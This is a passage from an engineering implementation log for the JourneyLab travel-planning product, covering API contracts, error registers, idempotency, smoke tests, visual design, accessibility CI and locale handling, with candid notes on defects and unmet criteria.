because an open one is somewhere a credential arrives undeclared.

**PCI scope you never enter is scope you cannot leak.** JourneyLab deep-links and
records attribution; it never sees a card, and now it has nowhere to put one.

### Estimated and confirmed are states, not a flag
A boolean `is_confirmed` makes an estimate and a confirmation the same field with
different values, which is how a default of `false` becomes a default of `true`
in somebody's mapper — and `REQ-EVID-003` exists precisely to stop an estimate
being rendered as confirmed. Three named states also express `cancelled`, which a
boolean cannot. A test forbids the boolean spellings from reappearing anywhere.

### Repair generation is separated from acceptance by shape, not by rule
`generateRepairs` returns options and changes nothing; `acceptRepair` is the only
operation in the contract that alters a live plan in response to a disruption.

The separation is enforced by their signatures: generation does **not** take
`If-Match` and acceptance does. Requiring a version precondition on a read-only
projection would imply it mutates, and the next person to touch it would make
that true.

The product reason: a traveller mid-trip must be able to look at what a
disruption costs without committing. A single operation that generated and
applied would replan their afternoon while they were still reading option one.

### Invitations, where a link is a credential
`expires_at` is required with no default. `role` excludes `trip_owner` —
transferring a trip is a deliberate act, not something you can forward. The token
is returned **once** and a test asserts no read operation can return it, because
a collaboration link an API hands back is a link an attacker asks for. Revocation
is immediate and irreversible; reissuing is cheap, and a reversible revocation is
one the holder can wait out.

### Silence is not dissatisfaction
`consent_scope` is required on feedback, with the narrowest option first, because
feedback is training signal and using it without a stated scope uses someone's
trip to improve a model they did not agree to improve.

**No field can record that feedback was not given.** The moment one exists,
something treats silence as a negative label — and a traveller who simply got on
with their holiday is not an unhappy one. Asserted against five spellings.

### A conflict I recorded rather than resolved
The register lists `collaboration.invitation_expired` at **403**, described as
"fail closed, leak nothing". Those are in tension: an attacker guessing tokens
learns which guesses are real if "expired" is distinguishable from "never
existed".

No operation here returns it — redemption is not declared — so nothing is wrong
today. When redemption is designed it must use the indistinguishable denial and
the 403 will need revisiting. Flagged for `.04` rather than changed now: altering
a security-relevant status with no operation to test it against is a change
nothing exercises.

### One more graph observation
`impact(ERROR_CODES)` returns **ambiguous** — the same declaration indexed twice,
as `Property` and as `Variable`, both at line 35 — and both candidates report 0
impacted, which is also wrong, since the constant is imported by three modules.
Minor beside the JSX, CSS and FTS gaps, recorded for the same reason: a tool that
answers confidently and wrongly is worse than one that declines.

### What is NOT met
`DATA-013` and `DATA-015` are referenced and undefined, joining `DATA-006`,
`009`, `010`, `011`, `012`, `014`. STEP-006 owns the canonical data model.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Invitation redemption + the `invitation_expired` 403 conflict | STEP-004.04 |
| Offline manifest shape against real device constraints | STEP-017 |
| `DATA-013`, `DATA-015` | STEP-006 |

---

## IMPL-026 — STEP-004.02 — Trip, brief and scenario operations (API-001…009)

| Field | Value |
| --- | --- |
| Date | 2026-08-11 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-PLAT-005, REQ-PLAT-008 (enforcing REQ-SEC-004, REQ-EVID-001/002/003, REQ-CONS-005/006/011, REQ-PRIV-003) |
| Blast radius | [BR-029](blast-radius/BR-029-trip-scenario-operations.md) (MEDIUM, confidence HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | `c524820` — matched HEAD at pre-change |

### What was built
Nine operations in `contracts/openapi.yaml` with 15 new schemas, 5 parameters and
a shared infeasibility response. 40 assertions over the contract. Python suite
405 → **440**. Nothing is implemented; that is the point.

### The pre-change check found a contract defect before any code was written
`API_CONTRACTS.md` declared three error codes `ERROR_MODEL.md` does not define:
two transpositions (`coverage.insufficient_evidence` for
`evidence.insufficient_coverage`, `provider.unavailable` for
`coverage.provider_degraded`) and one — `validation.invalid_party` — with **no
entry at all**, against a Validation class §2 has declared since the document was
written.

**None of it would have failed anything.** `API_CONTRACTS.md` is prose and nothing
read it; a client branching on a code the server can never send does not error, it
just never takes that branch. The drift only became visible because `.01` made the
register generated. `TestTheTwoRegistersAgree` now gates it, mutation-tested with
a seeded `provider.made_up`.

Two `validation.*` codes were registered, not a family. A register that
anticipates codes nobody raises rots, because nothing fails when a speculative
entry is wrong.

### Three defects the examples caught in my own contract
This is the argument for contract-first, so it goes in full.

**`PUT /brief` required `If-Match` but not `Idempotency-Key`.** My reasoning was
that a conditional PUT is naturally idempotent. Not good enough: if the first
attempt succeeds and the response is lost, the retry carries a stale `If-Match`
and gets a 409, leaving the client unable to tell whether its change applied.
`If-Match` prevents a lost update; the key prevents a lost **answer**.

**`.01` guessed the remediation shape and `.02` proved it wrong.** It declared
`conflict_set` and `relaxations` as arrays of strings before any operation needed
one. A relaxation must name the constraint it relaxes — "depart at 15:00 instead"
is not actionable unless the reader knows which of three constraints it addresses.
`Problem.remediation` now fixes only `kind`.

**`allOf` with `additionalProperties: false` rejected a field the same schema
requires two lines later.** Each branch validates the whole instance
independently, so a closed branch rejects a property another branch declares. A
schema built for composition cannot be closed; `Party` and `Money` are leaves and
are closed precisely because they are.

### The requirements are enforced by types, not by convention
| Requirement | How |
| --- | --- |
| REQ-EVID-001 | A volatile field's **type** is `Evidenced`, whose provenance members are all required. A bare number cannot be returned |
| REQ-EVID-003 | `status` is required with **no default** — a caller cannot omit it and get `confirmed` for free |
| REQ-EVID-002 | `conflicts[]` retains disagreeing sources. The mean of two departure times is a time no ferry leaves |
| REQ-CONS-005 | The infeasible response **requires** remediation, and a conflict set needs **≥ 2** constraints. A one-item set means the solver failed to explain |
| REQ-CONS-006 | `brief_version`, `evidence_pack_id` and `random_seed` are on the scenario, so a run can be repeated exactly |
| REQ-SEC-004 | Every `{id}` operation reuses the shared denial; **no operation declares a 403** |
| REQ-PRIV-003 | `accessibility_needs` is declared-only, and `Party` is closed so an undeclared sensitive attribute cannot arrive |

### Also worth stating
**`DATA-010` and `DATA-011` do not exist.** The operations reference them and
`DATA_CONTRACTS.md` defines neither — along with 006, 009, 012, 014 and 015. That
is the canonical data model, owned by STEP-006. Noted, not fixed: inventing data
contracts here would put a second author on a document with an owner.

**The 500 ms job-handle promise is declared, not met.** It is a contract
obligation with no implementation to measure. Recorded as such.

**`--repair-fts` does not exist.** `BR-028` recorded the degraded concept search
and quoted the tool's own advice. Running it returns `error: unknown option`, and
`--force` does not rebuild the indexes either. A warning now sits in the
hand-maintained section of `CLAUDE.md`, because the working agreement tells
contributors to use that query *instead of grepping* and it answers "nothing"
rather than failing.

### Follow-ups
| Item | Owner step |
| --- | --- |
| `DATA-006/009/010/011/012/014/015` | STEP-006 |
| Impact-preview token semantics | STEP-014 |
| Collaboration and booking operations | STEP-004.03 |
| Verify the 500 ms job handle against a real handler | STEP-010 / STEP-012 |

---

## IMPL-025 — STEP-004.01 — Global API conventions: errors, pagination, idempotency, ETags

| Field | Value |
| --- | --- |
| Date | 2026-08-11 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-PLAT-005 (and REQ-SEC-004, REQ-SEC-001, REQ-PRIV-004 in enforcement) |
| Blast radius | [BR-028](blast-radius/BR-028-api-conventions.md) (MEDIUM, confidence HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | `f50d854` — matched HEAD at pre-change |

### What was built
`contracts/openapi.yaml` (OpenAPI 3.1, conventions only), `contracts/schemas/`,
and `apps/api/src/conventions/` — problem details, cursor pagination, idempotency
and optimistic concurrency. 70 new assertions; the Python suite goes 335 → 405.

### The register is generated, which is ADR-012 for the second time
`ERROR_MODEL.md` §3 is a table of 21 error codes with, per row, the HTTP status,
the meaning, the remediation and **the requirement the code exists to serve**.
That last column is why the document is the source and the code is the output: an
error code exists to satisfy a requirement, and the traceability belongs where a
product owner reads it, not in a Python literal.

One parser, two emitters — a Python module the API raises from, and a JSON Schema
the contract publishes. 17 of the 21 are client-visible; the rest are internal
conditions that surface as a fallback or a warning and **cannot be returned to a
caller at all**, which the code enforces rather than notes.

**The parser refuses to guess.** It rejected `"500 + **SEV1 alert**"` and made me
resolve it explicitly, with the reason written down: the client gets a plain 500
carrying a correlation ID, because telling a caller their request tripped a
cross-tenant detector confirms the boundary they were probing. A regex grabbing
the first number would have encoded that silently.

### `problem()` takes a code, not strings
The register is the only way in. A free-form constructor produces eighteen
slightly different spellings of "not found" within a year, and clients that branch
on prose.

`safe_detail()` **raises** on a traceback, connection string, credential or email
rather than redacting. Redaction is the friendlier behaviour and the wrong one: it
turns a developer mistake into a silently-truncated message that still ships, and
the next reader assumes the sanitiser covers cases it does not. Same reasoning as
`redaction.py`, which fails closed.

`retryable` is explicit, never inferred from the status — `ERROR_MODEL.md` is
emphatic about it, and the tests pin two 5xx codes with opposite answers.

### The parser silently undid a security decision, and a test caught it
`ERROR_MODEL.md` writes the status of `authz.forbidden` as **"403/404"**, meaning
the two are deliberately indistinguishable. It does not say which is sent. My
parser took the first, so `opaque_denial()` returned **403** — quietly reversing
STEP-002.02, whose entire point is that a 403 still confirms something is there to
be forbidden.

Forced to 404 at the single call site, with the reasoning in the code, so the
register keeps documenting the pair while exactly one is sent. The test asserts
the status, the byte-identical body, the absence of a `detail` field, and the
function's **signature** — adding a `reason` parameter fails the build, because
an optional detail argument is precisely how indistinguishability erodes.

### Cursors are base64, not encryption
So the module never pretends otherwise. A cursor carries a sort key and an
identifier; 14 identity-shaped keys are rejected **on decode as well as encode**.
Encode-side validation protects against our mistakes, decode-side against the
client's, and only one of those is an attacker — a hand-crafted cursor never
passes through `encode_cursor`.

Every malformed cursor raises the identical message, so a caller learns nothing
about why. Offset pagination is absent *structurally*: there is no such parameter
anywhere, so a handler cannot accept one by copying the shape.

### Idempotency and ETags answer different questions
Constantly confused, so the module says so: `Idempotency-Key` asks "is this the
same request I already handled?", `If-Match` asks "is the resource still in the
state you read?". A command needs both — idempotency alone lets a stale editor
clobber a newer version; ETags alone let a network retry create two trips.

Two details worth their comments: header lookup is **case-insensitive**, because
HTTP header names are and a dict is not, and a miss there creates duplicates. And
a **missing** `If-Match` is refused rather than treated as consent, because
treating absence as "no opinion" loses an update on the first request that forgets
the header.

### Two more of my own mistakes
**I searched prose and found the warning.** The test asserting money is not a
float did `"float" not in json.dumps(money)` and matched the schema's own
description explaining why floats are forbidden. Fourth time in this repository.
Now asserts on declared types and `additionalProperties: false`.

**A ratchet fired on a word.** The cross-tenant pending-vector detector reported
that a cache subsystem had landed, because `redis` appears inside a *prohibition*
regex in `problem.py`. It searched raw source text, so it found the warning as
readily as the violation. It now strips comments and string literals and matches
the shape of use — and because narrowing a detector that exists to fail on purpose
is dangerous, a new test proves it still sees real code, still ignores a literal,
and still trips on a seeded `import redis`.

### A third graph limitation, and this one is repairable
`gitnexus_query` returned nothing and warned **"FTS indexes missing — keyword
search degraded"**. The concept search `CLAUDE.md` tells contributors to use
instead of grepping has been quietly degraded for an unknown number of sub-steps.
It did not fail; it returned an empty result, which reads exactly like "no such
concept exists".

Not repaired here — re-indexing with `--repair-fts` mid-change would invalidate
the pre-change state `BR-028` is written against. Carried to STEP-026 with the JSX
and CSS gaps.

The good news alongside it: `impact(opaque_denial)` returned **2 direct callers,
1 execution flow, `epistemic: exact`** — the first genuinely useful graph answer
in this repository. Python functions are called with parentheses, so the call
graph traces them.

### What is NOT met
**`auth/errors.py` still returns the STEP-002.02 body.** It is not RFC 9457, and
migrating it means changing a function with two live callers inside a traced flow
with **no HTTP surface to verify the migration against** — `apps/api` has no
routes yet. Carried to STEP-004.04, where the platform routes land. — **superseded: `.04` established the carry was mistaken (STEP-004 declares contracts only, no handler exists to verify a migration against). The migration is STILL OUTSTANDING and re-carried to STEP-008**, where the first route handlers land. Surfaced by the STEP-001.08 guard, which found it had been homeless since STEP-004.01.

Until then **two error shapes exist in the repository**, which is stated in
`BR-028` §7 rather than left to be discovered.

**Rate-limit values.** The mechanism is declared; the numbers need capacity
projections that do not exist (`ASM-002`). Declaring invented limits would be
worse than declaring none.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Migrate `auth/errors.py` to problem details | STEP-004.04 |
| Rate-limit values | After capacity projections (`ASM-002`) |
| `gitnexus analyze --repair-fts` | STEP-026 |
| Generated clients from this contract | STEP-004.07 |

---

## IMPL-024 — STEP-003 closure — End-to-end smoke test and README accuracy

| Field | Value |
| --- | --- |
| Date | 2026-08-11 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-PLAT-001 (repository accuracy), REQ-SEC-003, REQ-SEC-006 |
| Blast radius | [BR-027](blast-radius/BR-027-e2e-smoke-and-readme.md) (LOW) |
| Commit | see git log for this entry |

### What was built
`tests/e2e/smoke.sh` (`pnpm e2e`) — 22 checks across seven sections: infrastructure,
schema and row-level security, backend, frontend, the running application over real
HTTP, the accessibility gate, and repository invariants. Plus a README that
describes the repository as it now is.

### Why a separate suite from `pnpm verify`
`verify` proves each layer in isolation and never starts the whole system. This
does, in the order a real request meets it — and it takes about four minutes on
top of verify's three.

**It is deliberately not in `verify`.** A seven-minute gate gets skipped, and a
skipped gate is worse than a slow one. The honest cost is that nothing runs `pnpm
e2e` automatically; it is a command a person must remember, and that gap closes
when there is a pipeline stage that can afford Docker (`STEP-027`). Written down
rather than glossed.

### The first run found four defects — all of them in the test
That is the part worth recording, because a new test suite that reports failures
is only useful if you check which side the fault is on.

| Reported | Actually |
| --- | --- |
| "Redis responds to PING" FAILED | The compose service is `cache`, not `redis`. Redis was fine |
| "PostgreSQL accepts TCP" FAILED | `compose up --wait` returns when the healthcheck passes, but PG18 can still answer *"the database system is in recovery mode"* for several seconds. Same family as BUG-009 |
| "sign-in redirect lacks PKCE S256" FAILED | **The worst of the four.** The suite exported placeholder Auth0 credentials; `process.loadEnvFile` does not overwrite variables already set, so the placeholders beat the real configuration. The suite broke the config and then reported the breakage as a product defect |
| "knowledge graph is current at HEAD" FAILED | The working tree had uncommitted changes, which makes staleness correct rather than wrong |

A fifth appeared on the next run: *"PostgreSQL never became queryable on 5700"*,
reported while the twelve row-level-security assertions in section 2 were passing
against that same database three seconds later. The probe had hard-coded
`-U postgres`; the role is `journeylab`.

Two of these are wrong in the direction of alarm, which erodes trust in a suite
exactly as fast as being wrong in the direction of comfort. All are fixed: real
configuration is used when it exists and the PKCE assertions become a SKIP when
they cannot honestly run; a dirty tree produces a SKIP with the reason; and the
database probe now uses the same credentials the compose file and the isolation
suite use.

**The pattern across all five is one mistake made repeatedly:** I wrote each
probe from my assumption of how the system connects rather than from how the
working code connects. The service name, the database role, the credential
precedence and the readiness semantics were all available to be read, in files I
had already opened. A smoke test that invents its own access path is testing my
memory of the system, not the system.

### Final result
**25 passed, 0 failed, 2 skipped.** Both skips are honest and say why: framing/CSP
headers do not exist until STEP-023, and the knowledge graph is legitimately stale
while the working tree is dirty. Neither is counted as a pass.

### What the suite asserts that nothing else did
Three security properties, end to end against a running production build:

- The session endpoint answers an anonymous caller and **leaks no token** —
  httpOnly cookies stay server-side.
- Sign-in redirects with **PKCE S256 and a `state` parameter**.
- The component gallery is **404 without its flag**, checked against a server
  started without it.

### The same environment lesson, one layer up
`pnpm ci:local` then failed the browser suite: six desktop tests timed out at 30s
while the mobile project passed. Playwright defaults to one worker per two CPUs
and each worker drives a Chromium instance — in the same 4 GB container that had
just exhausted the jsdom workers.

Capped at two workers with a 90s budget **under CI only**. That is a budget for
the environment, not for the product: the Core Web Vitals assertions inside the
suite are untouched and still gate at 2.5s LCP and 200ms interaction, so a slow
runner may take longer to finish but may not report a slow page as acceptable.

**This is the second time in two commits that a default tuned for a developer
machine failed in a constrained container**, and the failure looked like a
different problem each time — a module-resolution error, then a page timeout.
Worth stating as a pattern rather than as two incidents: any default that scales
with CPU count is a memory decision in disguise, and CI is always the machine
with less memory than you assumed.

### The README was substantially untrue
It said *"Pre-implementation — no product code yet"*, *"13 checks"*, and *"the
graph currently indexes documentation only"*. All three had been false for
several sub-steps. It also still listed `BLK-002` and `DEC-004` as open, both
closed.

It now states what exists, the real test counts, the two graph coverage gaps
(JSX untraced, CSS absent), and what remains deliberately unmet with an owner
against each.

### A guard that was wrong
`readme-accuracy.sh` extracted script names with `pnpm [a-z][a-z:]*`, so `pnpm
a11y` was read as `pnpm a` and reported missing. A false failure, and the kind
that gets a guard disabled rather than fixed. The pattern now accepts digits.

### Section 5b exists because of BUG-019
While starting the dev server so the owner could look at the design work, the
gallery returned **500**. It returns 200 from a production build and passes all 40
accessibility assertions there.

**Every automated check in this repository builds for production** — the browser
suite, `pnpm verify`, `pnpm ci:local`, and section 5 of this very suite. `next dev`
renders on a different path with a different tolerance for server-side errors, and
had no coverage whatsoever. The defect survived a whole sub-step and was found by a
person opening a URL.

Section 5b now starts `next dev`, asserts three routes render, and **fails if the
server logged an exception while rendering** — a route that renders while throwing
is half-broken, which is exactly how this looked in production.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Run `pnpm e2e` in a pipeline stage that can afford Docker | STEP-027 |
| Framing/CSP headers — currently a SKIP in the suite | STEP-023 |

---

## IMPL-023 — STEP-003.09 — Visual design language

| Field | Value |
| --- | --- |
| Date | 2026-08-11 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-A11Y-004, REQ-NFR-007, REQ-NFR-013 |
| Blast radius | [BR-026](blast-radius/BR-026-visual-design.md) (MEDIUM, confidence HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | `3793494` — matched HEAD at pre-change |

### Why an unplanned sub-step
STEP-003 had eight sub-steps and none of them was design. `.01` delivered
accessible tokens, `.02`–`.07` behaviour, `.08` the accessibility floor. The
owner reviewed the `.08` screenshots and rejected the result, correctly: it was
legible, operable, standards-clean and looked like an unstyled document, because
in most respects it was one.

Direction was delegated with "use your judgement". This is what that produced.

### The brief I gave myself
JourneyLab shows which futures are feasible and the evidence behind each one. The
interface is a reading surface for decisions someone will act on, sometimes under
pressure, sometimes on a phone in an unfamiliar place. That argues for four
things, and against personality:

- **Hierarchy over decoration** — the eye should find the answer, not the chrome.
- **Colour reserved for meaning** — status and action only. Colour used to look
  nice stops meaning anything when it needs to.
- **Density that stays legible** — five scenarios across seven days is a lot of
  information; whitespace that turns that into scrolling is not generosity.
- **Calm** — a product that says "this plan does not work" should not be jaunty.

### What changed
**Warm neutrals instead of blue-grey.** The old ramp was the default palette of
every developer tool; the content here is places and times of day. The hue moved
and the luminance did not, so no contrast ratio regressed.

**Three border weights.** There had been one, so a hairline between table rows
was drawn at the same weight as the outline of a text input. That single fact is
most of why `.08` looked like a wireframe.

**Status surface tints, each with declared contrast pairs.** A tinted panel reads
faster than a coloured edge alone. Twelve new pairs assert text and edge contrast
on every tint — a tinted panel is the easiest place in a design system to lose
contrast, because the tint is chosen for feel and the text colour is inherited
from somewhere else.

**A radius scale.** Everything had used `--space-1`, so a text input and a
full-screen dialog wore the same 4px corner.

**A system font stack, as a decision rather than a placeholder.** A webfont costs
a request on the critical path and either blocks paint or swaps mid-read; both
damage LCP, which `.08` now gates. It also fails exactly when a traveller most
needs the page. It is one fewer third-party origin in the CSP as well.

Plus optical tracking, a 65ch measure on prose, two-layer shadows, tabular
figures for times and prices, a sticky header, and content centred in 72rem.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — 335 Python + 61 web + **307 UI** + **40 browser** |
| `pnpm ci:local` | **PASS** |
| Guard meta-suite | 43/43 |

### The accessibility gate rejected my design three times
This is the part worth keeping, and it is the argument for having built `.08`
before `.09` rather than the other way round.

1. **I shrank checkbox and radio to 20px.** It looks better beside 14px label
   text. SC 2.5.8 requires 24×24, and a checkbox is its own target regardless of
   the 44px row it sits in. Rejected in one run, in both device profiles.
2. **I raised the gallery grid minimum to 22rem** and put 2px of horizontal
   overflow at 320px into the document. A grid item defaults to
   `min-width: auto` and refuses to shrink below its widest unbreakable word; one
   long place name widened a track, the track widened the page. WCAG 1.4.10.
3. **A `margin: -1px` survived from the older `clip: rect()` visually-hidden
   technique**, putting the skip link at `x = -1`. Two more pixels of overflow,
   from a leftover of a technique we do not use.

Each of those looks fine by hand, tests fine in jsdom, and quietly fails a
standard. In any other order they would have shipped.

### A test that failed correctly, and had to be sharpened rather than loosened
The status-token coverage rule requires every `status-*` colour to have an icon
and a label, so nothing can signal by colour alone. It caught the four new
`-surface` tints and demanded icons for them.

A tint is not a signal — the foreground colour, the icon and the label are — so
requiring an icon for `status-success-surface` asks for something meaningless.
The rule now excludes the `-surface` suffix. **The easy fix would have been to
ignore anything unmatched, which would have made the whole test vacuous**, so a
second test asserts that a hypothetical new signal colour is still caught while a
hypothetical new tint is not.

### And one flaw in the gate itself
The INP check measured a single interaction. It reported 422 ms once on a machine
that was also building, and 7 ms when idle. That is a flaky gate, and `BUG-016`
already established a flaky gate is worse than a failing one: it teaches people
that re-running is the fix. It now takes the median of five interactions, which
is stable against a scheduling hiccup and still fails outright for a handler that
genuinely blocks the main thread.

### The CI mirror rejected the commit twice, for a reason that was not the code
`pnpm ci:local` failed with 7 of 8 UI suites unable to collect:

```
[vitest-worker]: Timeout calling "fetch" with "[".../tokens.test.ts","web"]"
```

That names a module path, so I chased a dependency problem — first a
`vite-node`/`vitest` version mismatch in the lockfile, then an incomplete cold
install. **Neither existed.** I believed the error's implied cause twice before
capturing the full log and reading it properly.

The actual cause: Docker allocates the container 4 GB, vitest defaults to one
worker per CPU, and every worker in this package builds its own jsdom and loads
axe-core into it. Eight jsdoms exhaust the container, the main thread stops
answering transform requests, and the workers time out.

Capped at two workers under `CI` only, with a longer transform timeout. That is
a fix rather than a workaround: a suite that needs several free gigabytes is
fragile on any shared runner. Verified by running the capped path locally with
`CI=true` — 307 pass either way.

### What is NOT met
**Iconography.** `STATUS_TOKENS` names an icon per status — `check-circle`,
`alert-triangle` — and nothing renders them. The non-colour signal is currently
carried by the text label and the panel edge, which satisfies REQ-A11Y-004, but
the tokens describe a system that does not exist yet.

**A logo, illustration, and marketing surfaces.** Out of scope and unscheduled.

**Any of this validated with a user.** It is one implementer's judgement against
a written brief. It is defensible, not proven.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Icon set to make `STATUS_TOKENS` real | STEP-013, with the first visualisation |
| Design review with someone who is not the implementer | Before GA |
| Chart and map palettes (categorical, colour-blind safe) | STEP-013 |

---

## IMPL-022 — STEP-003.08 — Automated keyboard and axe checks in CI

| Field | Value |
| --- | --- |
| Date | 2026-08-10 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-A11Y-001 (and REQ-A11Y-004, REQ-NFR-013 in passing) |
| Blast radius | [BR-025](blast-radius/BR-025-accessibility-ci.md) (MEDIUM, confidence HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | `1d67ffc` — matched HEAD at pre-change |

### What was built
Playwright with `@axe-core/playwright`, running against a **production** build in
two profiles (Desktop Chrome, Pixel 7): 20 tests × 2 = 40. A gated component
gallery at `/dev/gallery` as the surface to walk. `packages/ui/src/components.css`.
A runtime accessibility counter. `tests/guards/gallery-gate.sh`.
`ACCESSIBILITY_AUTOMATION_LIMITS.md`. All of it inside `pnpm verify`, so it runs
locally exactly as it runs in CI.

### The headline: a browser found seven defects that 256 jsdom tests could not

This is the whole argument for the sub-step, so it goes first.

| # | Defect |
| --- | --- |
| 1 | **Checkboxes and radios rendered 13×13.** Text inputs 21px tall, selects 19px, table sort buttons 21px. Every one below the 24×24 WCAG 2.2 SC 2.5.8 requires |
| 2 | **28 of the design system's 40 class names had no CSS whatsoever.** Only the shell, nav and skip link were styled. Everything else was browser defaults |
| 3 | **A `color-contrast` failure on the home page** — `#888` on white is 3.5:1 |
| 4 | **32px of horizontal overflow at a 320px viewport** — WCAG 1.4.10 Reflow |
| 5 | **`forced-colors` was overridden with our palette**, and axe measured the result at 1.07:1 |
| 6 | **Valid and disabled fields wore the error styling** |
| 7 | **The gallery's own CSS outranked `.jl-nav__link`** and shrank nav targets from 44px to 24px |

jsdom has no layout engine. It will state, correctly and uselessly, that a
checkbox exists, is labelled, is reachable by keyboard — and is 0×0. Every
geometric assertion made in seven previous sub-steps was vacuous, and none of
them could have known.

Defect 7 is the most instructive: it was **introduced by me, four minutes
earlier**, in the fix for defect 2, and caught on the next run. A gallery must
never restyle its specimens or it measures itself.

### The forced-colors mistake was conceptual, not a typo
`tokens.css` had one media query for `prefers-contrast: more` **and**
`forced-colors: active`. They are different signals:

- `prefers-contrast: more` says *"I want more contrast"*. Our AAA palette is the
  right answer.
- `forced-colors: active` says *"I have chosen my own palette"*. It is not ours
  to override — Windows High Contrast ships light themes as well as dark ones —
  and the override does not even work: the user agent replaces `background-color`
  regardless while authored text colour may survive, so black-and-yellow became
  yellow on whatever canvas the system picked.

The forced-colors branch now maps every token onto a CSS system colour. Status
tokens all resolve to `CanvasText`, which is fine precisely because
`REQ-A11Y-004` already required a non-colour signal for every status.

### Why there is a gallery, and why it is gated by an explicit flag
"axe over every component story" needs stories, and there is no Storybook. The
gallery is one route rendering every primitive in every quality state.

`NODE_ENV !== 'production'` would be the obvious gate and is wrong here: the
accessibility run must walk a **production** build, because that is the build
whose Core Web Vitals and hydration behaviour are worth measuring. So the gate is
`JOURNEYLAB_ENABLE_GALLERY === '1'`, default off — exact match, because
`'false'` and `'0'` are both truthy strings and both mean off.

`notFound()`, not a 403: a 403 confirms the path exists.

The gate is verified by `tests/guards/gallery-gate.sh`, which boots a production
server **without** the flag and asserts 404. It is deliberately not a Playwright
test — the harness sets the flag in order to do its job, so it can only ever
prove the positive case.

### What the runtime counter is, and is not
Not axe in production: walking the accessibility tree on a traveller's phone
would cost more than the page, and a violation found on the device is already in
front of the user.

It counts the failures that only exist in a real session — chiefly **focus
falling to `<body>` after a client navigation**, which axe cannot see because it
is a property of a transition, not of a page. For a sighted user nothing
happens; for a keyboard user the next Tab starts from the top of the document.

The event is `{signal, surface}` and nothing else. An accessible name can contain
a traveller's name or destination, so element text is never reported — a test
asserts the event has exactly those two keys, so a field cannot be added quietly.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` (guards + lint + typecheck + Python + tests + build + gate + browser) | **PASS** |
| `pnpm ci:local` (Linux, clean checkout, cold install, `CI=true`) | **PASS** — after rejecting three commits first; see the regression entry |
| Playwright | **40 passed** (20 × desktop and Pixel 7) |
| UI / web / Python | 267 / 61 / 335 passed |
| Guard meta-suite | **43/43** |

**Mutation testing.** The gallery gate forced open ⇒ guard fails. `ignoreBuildErrors`
reverted ⇒ build fails. A seeded `image-alt` violation ⇒ axe run fails — that one
is a permanent test, not a one-off mutation, because §7 asks for it explicitly.

### Six carried criteria closed
| From | Criterion |
| --- | --- |
| STEP-003.01 | forced-colors rendering |
| STEP-003.04 | real-browser verification of table and list |
| STEP-003.05 | skip-link visible on focus; Core Web Vitals |
| STEP-003.06 | touch-target size; the 48rem breakpoint |
| STEP-003.07 | RTL layout in something that lays out |
| STEP-002.05 | auth-flow page accessibility — the contrast failure was on that page |

### What is NOT met, and is documented rather than glossed
`ACCESSIBILITY_AUTOMATION_LIMITS.md` exists because §5 asks for it, and because
the honest number is that automation finds **a third to a half** of real
accessibility defects.

Not covered, and not coverable: whether an announcement makes sense; screen-reader
behaviour across the five required AT/browser combinations; whether focus *order*
is logical as opposed to unstuck; cognitive load and error recovery; meaning
carried by hue within a chart; voice control, switch access and magnifiers.

**Core Web Vitals are lab numbers.** §7's budgets specify mid-tier mobile on 4G;
this runs on a CI machine over loopback. It catches regressions. It cannot confirm
the budget for a traveller on a ferry — that needs real-user monitoring at
STEP-024, and is recorded as unmet rather than counted.

### Surprises
**A stale server made me believe I had broken every stylesheet.** A screenshot came
back completely unstyled; the CSS chunk was 500ing. The cause was an orphaned
`next start` from a previous run still bound to 5708, serving the previous build's
HTML with a chunk hash that no longer existed. The guard now refuses to run if the
port is occupied rather than measuring the wrong server.

**`pnpm typecheck` caught what `pnpm --filter @journeylab/ui typecheck` could not.**
The BUG-018 fix needed `allowImportingTsExtensions` in a *second* package, because
`apps/web` typechecks `packages/ui/src/tokens.ts` through the workspace import.
Only the full per-package run said so.

**A guard reported PASS while its cleanup did nothing.** `gallery-gate.sh` used
`lsof`, which node:24-bookworm does not ship. On Linux the trap failed silently,
the guard still printed PASS, and the accessibility run that follows it died on
an occupied port. A cleanup that depends on a tool which may be absent is a
cleanup that fails on the machine you were not testing on — so liveness is now
decided by asking the server with curl, and the guard escalates until the port
is genuinely free rather than assuming it is.

**The meta-test stopped testing anything, on Linux only.** The seeded `image-alt`
violation is prepended to `<body>`, which React owns; there, hydration finished
after the injection and discarded it. The one test whose job is to prove the gate
can fail was quietly proving nothing. It now waits for hydration and asserts the
seed is still in the DOM before axe runs.

**The graph reports zero dependents for every React component.** See BR-025 §3:
`CALLS` edges come from function calls, and a component used only as JSX is never
called. `impact(SkipLink)` returns 0 against eight real references.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Manual screen-reader journeys across the five AT/browser pairs | Every release |
| Real-user CWV monitoring to replace the lab numbers | STEP-024 |
| Component impact analysis is unreliable (JSX not traced) | STEP-026 |
| A visual design pass — `components.css` is accessibility styling, not design | Design, unscheduled |
| Voice control, switch access, 200%/400% zoom | Before GA |

---

## IMPL-021 — STEP-003.07 — Locale, time zone, currency and DST handling

| Field | Value |
| --- | --- |
| Date | 2026-08-10 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-NFR-007, REQ-NFR-008 (and REQ-SEC-006 on the negotiation path) |
| Blast radius | [BR-024](blast-radius/BR-024-i18n-locale-timezone-money.md) (MEDIUM, confidence HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | `bb943f9` — matched HEAD at pre-change |

### What was built
`packages/ui/src/i18n/` — `money.ts`, `datetime.ts`, `messages.ts`; `apps/web/src/lib/i18n.ts` and `messages/en.ts`; `tests/guards/logical-css.sh`. The root layout now negotiates a locale per request. 36 new tests (256 UI, 61 web).

### DST is a feasibility concern, not a formatting one
The sub-step record said it before the work started, and it shaped everything: *"an itinerary crossing a transition computes wrong travel windows, which STEP-012 will then present as a valid plan."*

A formatting bug shows a wrong string. A DST bug ships a wrong plan — and it ships it looking correct, because the solver will already have declared it feasible.

